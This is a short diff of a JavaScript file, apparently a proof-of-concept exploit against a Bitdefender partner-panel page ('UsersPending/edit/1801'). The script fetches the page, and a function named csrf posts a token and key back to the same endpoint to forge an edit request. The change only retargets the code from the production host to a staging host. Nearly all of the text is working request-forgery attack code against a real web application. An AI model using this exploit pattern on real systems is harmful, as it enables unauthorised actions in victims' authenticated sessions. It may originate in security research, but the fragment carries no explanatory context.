@@ -30,7 +30,7 @@ xhr.onreadystatechange = function () {
     }
 }
 
-xhr.open("GET", "https://pan.bitdefender.com/UsersPending/edit/1801", true);
+xhr.open("GET", "https://pan-stage.bitdefender.com/UsersPending/edit/1801", true);
 xhr.send(null);
 
 
@@ -52,7 +52,7 @@ function csrf(token, key) {
     params += "data%5B_Token%5D%5Bkey%5D=" + key;
 
     var x1 = new XMLHttpRequest();
-    x1.open("POST", "https://pan.bitdefender.com/UsersPending/edit/1801");
+    x1.open("POST", "https://pan-stage.bitdefender.com/UsersPending/edit/1801");
     x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     x1.send(params);
 }
